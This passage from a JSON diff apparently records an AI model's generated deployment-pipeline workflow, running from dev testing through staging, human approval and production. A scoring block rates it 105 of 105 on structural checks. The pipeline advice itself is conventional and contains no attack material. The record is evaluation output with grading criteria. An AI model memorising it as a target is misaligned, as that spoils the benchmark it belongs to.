+              "content": "Execute comprehensive testing in the dev environment to ensure components work together. Steps: 1) Run integration tests using tools like Postman for API testing, Selenium for UI automation, or Cypress for end-to-end flows. 2) Test database interactions with tools like DBUnit or by seeding test data. 3) Validate microservices communication with contract testing using Pact or consumer-driven contracts. 4) Perform security scans with OWASP ZAP or Burp Suite to identify vulnerabilities early. 5) Check performance benchmarks with load testing via JMeter or k6, targeting response times under 200ms for critical endpoints. Pass/fail criteria: All integration tests must pass, with no critical bugs (severity high or above) and security issues must be addressed before proceeding. Use test reporting tools like Allure or TestRail for visibility. If tests fail, automatically trigger a rollback to the previous stable build and notify the development team via chatops. Set up flaky test detection to avoid false positives."
+            },
+            {
+              "label": "Deploy to Staging Environment",
+              "category": "action",
+              "description": "Deploy the validated build to a staging environment for pre-production testing",
+              "content": "Deploy the application to a staging environment that closely mirrors production, including data and infrastructure. Steps: 1) Promote the artifact from dev to staging using artifact repositories or image tagging (e.g., docker tag). 2) Apply production-like configurations, such as scaling policies, logging levels, and monitoring alerts. 3) Use deployment strategies like canary releases or A/B testing to assess impact with a small percentage of traffic. 4) Ensure data consistency by syncing anonymized production data or using seed scripts. 5) Update DNS or load balancer settings to route traffic to the new deployment. Tools: Kubernetes with Helm charts for orchestration, or AWS CodeDeploy for automated deployments. Ownership: QA and operations teams. Error handling: Implement automated rollback if health checks fail within 5 minutes, using metrics from APM tools like New Relic. Log all changes for compliance and audit purposes."
+            },
+            {
+              "label": "Staging Acceptance Testing",
+              "category": "test",
+              "description": "Perform user acceptance and performance testing in the staging environment",
+              "content": "Conduct final validation in staging to ensure readiness for production. Steps: 1) Execute user acceptance tests (UAT) with business stakeholders using tools like TestRail or manual testing checklists. 2) Run performance and load testing with tools like Gatling or Locust, simulating peak traffic to ensure scalability (e.g., handle 10,000 concurrent users). 3) Conduct security penetration testing with tools like Nessus or manual ethical hacking. 4) Validate compliance with policies (e.g., GDPR, HIPAA) using automated scanners or audit logs. 5) Test disaster recovery procedures, such as failover to backup systems. Pass/fail criteria: UAT must have 100% approval from product owners, performance tests must meet SLA targets (e.g., 99.9% uptime), and no high-severity security findings. Use dashboards in Grafana or Kibana for real-time monitoring. If tests fail, document issues in Jira or similar ticketing systems and trigger a refinement loop back to development."
+            },
+            {
+              "label": "Production Approval Review",
+              "category": "review",
+              "description": "Human gate for approving the deployment to production based on test results",
+              "content": "This review node requires manual sign-off from authorized personnel (e.g., release managers, product owners) before proceeding to production. Criteria: 1) Verify that all tests from dev and staging have passed, with reports attached. 2) Check deployment artifacts for versioning and integrity. 3) Review change logs and risk assessments for any breaking changes. 4) Confirm that rollback plans are documented and tested. 5) Ensure compliance with organizational policies and regulatory requirements. Process: Use tools like Jira Service Desk or GitHub Pull Requests for approval workflows, with notifications sent via email or Slack. SLA: Reviews must be completed within 4 hours during business hours, with escalation to senior management if delayed. If rejected, provide detailed feedback and route back to staging testing for refinements. Maintain an audit trail of all approvals for accountability."
+            },
+            {
+              "label": "Deploy to Production",
+              "category": "action",
+              "description": "Final deployment of the application to the production environment",
+              "content": "Execute the production deployment with minimal disruption. Steps: 1) Use blue-green or canary deployment strategies to gradually shift traffic, monitored via tools like Istio or AWS Route 53. 2) Apply production-specific configurations, such as enabling CDN, SSL certificates, and firewall rules. 3) Update database schemas with migration tools like Flyway or Liquibase, ensuring zero-downtime migrations. 4) Enable real-time monitoring with APM tools (e.g., Dynatrace, AppDynamics) and logging aggregators (e.g., ELK stack). 5) Perform post-deployment smoke tests to verify critical functionalities. Ownership: Site reliability engineers (SREs). Error handling: Automatically roll back if error rates exceed 5% within 15 minutes, using canary analysis metrics. Document the deployment in runbooks and update incident response plans. Ensure backups are taken before deployment for disaster recovery."
+            },
+            {
+              "label": "Production Deployment Output",
+              "category": "output",
+              "description": "Confirmation and metrics of successful production deployment",
+              "content": "This node represents the final deliverable, confirming a successful deployment and providing operational metrics. Output includes: 1) Deployment report with timestamp, version, and changelog. 2) Performance metrics such as response time, error rates, and resource utilization from monitoring tools. 3) Compliance documentation, including audit logs and security scan results. 4) Notification to stakeholders via email, Slack, or dashboard updates (e.g., using Datadog or Grafana). 5) Update of release notes in Confluence or similar knowledge bases. Success criteria: Deployment must achieve 99.95% availability in the first hour, with no critical incidents reported. Distribute the output to teams like support, marketing, and management for awareness. Archive all artifacts and logs for future reference and continuous improvement in deployment processes."
+            }
+          ],
+          "edges": [
+            {
+              "from": 0,
+              "to": 1,
+              "label": "triggers"
+            },
+            {
+              "from": 1,
+              "to": 2,
+              "label": "drives"
+            },
+            {
+              "from": 2,
+              "to": 3,
+              "label": "feeds"
+            },
+            {
+              "from": 3,
+              "to": 4,
+              "label": "validates"
+            },
+            {
+              "from": 3,
+              "to": 1,
+              "label": "refines"
+            },
+            {
+              "from": 4,
+              "to": 5,
+              "label": "feeds"
+            },
+            {
+              "from": 5,
+              "to": 6,
+              "label": "validates"
+            },
+            {
+              "from": 5,
+              "to": 4,
+              "label": "refines"
+            },
+            {
+              "from": 6,
+              "to": 7,
+              "label": "approves"
+            },
+            {
+              "from": 6,
+              "to": 5,
+              "label": "refines"
+            },
+            {
+              "from": 7,
+              "to": 8,
+              "label": "outputs"
+            }
+          ]
+        }
+      },
+      "scoring": {
+        "score": 105,
+        "maxScore": 105,
+        "pct": 100,
+        "checks": [
+          "✓ Valid JSON response",
+          "✓ Workflow present",
+          "✓ Node count: 9 (min: 4)",
+          "✓ Node count: 9 ≤ 10",
+          "✓ All 11 edges valid",
+          "✓ Starts with trigger",
+          "✓ Ends with output",
+          "✓ 100% nodes have descriptions",
+          "✓ All nodes connected",
+          "✓ Content depth: avg 952c, no thin nodes",
+          "✓ Architecture covers: deploy, test",
+          "✓ Flow: path exists from first to last node",
+          "✓ Architecture: has feedback loops AND parallel branches (11 edges, 9 nodes)"
+        ]
+      }
+    }
+  ]
+}
